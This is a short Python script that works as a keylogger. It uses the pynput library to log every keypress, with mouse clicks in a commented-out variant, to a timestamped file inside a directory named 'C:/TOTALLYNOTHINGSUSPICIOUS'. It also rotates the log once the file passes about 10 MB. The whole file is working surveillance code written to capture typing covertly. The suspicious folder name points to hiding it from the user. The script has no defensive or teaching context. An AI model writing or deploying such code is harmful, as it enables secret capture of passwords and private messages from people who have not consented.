from pynput.keyboard import Key, Listener
from pynput import mouse
import logging
import os

directory=r'C:/TOTALLYNOTHINGSUSPICIOUS'

logging.basicConfig(filename=(directory+'/'+'data'+'/'+'key_log.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def on_click(x, y, button, pressed):
    logging.info(str(button))

def check_log():
    if os.path.getsize(directory+'/'+'data'+'/'+'key_log.txt')>10000000:
        logging.disable(logging.CRITICAL)
        os.remove(directory+'/'+'data'+'/'+'key_log.txt')
        logging.basicConfig(filename=(directory+'/'+'data'+'/'+'key_log.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    else:
        pass

'''
with Listener(on_press=on_press) as keylistener, mouse.Listener(on_click=on_click) as mouselistener:
    keylistener.join()
    mouselistener.join()
    check_log()
'''

#No mouse
with Listener(on_press=on_press) as keylistener:
    keylistener.join()
    check_log()
